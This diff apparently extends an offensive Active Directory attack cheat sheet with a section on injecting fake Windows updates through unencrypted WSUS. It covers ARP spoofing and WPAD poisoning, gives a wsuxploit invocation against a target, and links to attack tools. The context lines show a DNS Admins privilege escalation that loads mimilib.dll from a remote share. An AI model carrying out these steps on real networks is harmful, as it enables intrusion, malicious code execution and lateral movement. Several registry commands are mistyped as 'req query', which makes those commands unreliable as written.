@@ -30,6 +30,7 @@
     * [Image Change Privilege Escalation](#Image-change-Privilege-Escalation) 
 * [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
+* [Attacking WSUS](#Attacking-WSUS)
 * [Cross Domain attacks](#Cross-Domain-attacks)
   * [Kerberoast](#Kerberoast)
   * [MS Exchange](#MS-Exchange)
@@ -1014,6 +1015,48 @@ Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
 Sc \\<dns server> stop dns
 Sc \\<dns server> start dns
 ```
+
+## Attacking WSUS
+- When deployed without SSL encryption, its possible to perform man-in-the-middle attack and inject a fake update
+- Requirements
+  - WSUS without SSL encryption
+  - Only deliver binaries signed by MS, such as psexec
+  - Must perform arp spoofing or tamper with the system's proxy settings 
+- https://github.com/ctxis/wsuspect-proxy
+- https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf
+
+#### Identify usage of WSUS
+```
+req query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\Au /v UseWUServer
+```
+
+#### Retrieve WSUS URL
+```
+req query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+```
+
+### Injecting a fake update via straight ARP spoofing
+- https://github.com/pimps/wsuxploit
+- If unable to perform ARP Spoofing due to an arpspoof issue, use bettercap while the wsuxplit.sh is running.
+  - https://github.com/evilsocket/bettercap 
+
+### Inject fake update
+```
+.\wsuxploit.sh <TARGE IP> <WSUS IP> <WSUS PORT> <PATH TO SIGNED BINARY>
+```
+
+### Injecten a fake update via WPAD injection
+#### Check if automatic detection of the proxy is performed
+- If the 5th byte of the result of the query is even, automatic detection of the proxy may be set in Internet Explorer. Then we can use a poisoner like Responder or Inveigh to perform WPAD injection.
+```
+req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
+```
+
+### Attacking WSUS Server
+- WSUS server is most likely be interconnected to servers containing sensitive information.
+- After comprimising the WSUS server it might be possible to acces networks you weren't able before.
+- Inject a fake update directory to the WSUS server
+  - https://github.com/AlsidOfficial/WSUSpendu 
 
 ## Cross Domain attacks
 ## Azure AD
